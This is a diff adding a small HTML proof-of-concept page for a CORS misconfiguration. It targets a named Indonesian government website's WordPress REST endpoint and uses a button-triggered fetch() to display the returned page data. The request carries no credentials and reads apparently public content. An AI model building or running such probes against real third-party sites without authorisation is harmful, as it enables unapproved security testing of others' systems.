@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CORS PoC</title>
+  <style>
+    body {
+      font-family: monospace;
+      background-color: #000;
+      color: #0f0;
+      padding: 20px;
+    }
+    button {
+      padding: 10px 20px;
+      background-color: #0f0;
+      color: #000;
+      border: none;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    pre {
+      margin-top: 20px;
+      background: #111;
+      padding: 15px;
+      border: 1px solid #0f0;
+    }
+  </style>
+</head>
+<body>
+  <h1> CORS Misconfiguration PoC</h1>
+  <p>Target: <code>https://itjen.kemenhub.go.id/wp-json/wp/v2/pages/9</code></p>
+  <button onclick="runPoC()">GET DATA</button>
+  <pre id="output">[Klik tombol di atas untuk melihat data]</pre>
+
+  <script>
+    function runPoC() {
+      fetch("https://itjen.kemenhub.go.id/wp-json/wp/v2/pages/9")
+        .then(response => response.text())
+        .then(data => {
+          document.getElementById("output").textContent = data;
+        })
+        .catch(error => {
+          document.getElementById("output").textContent = "Gagal fetch data: " + error;
+        });
+    }
+  </script>
+</body>
+</html>
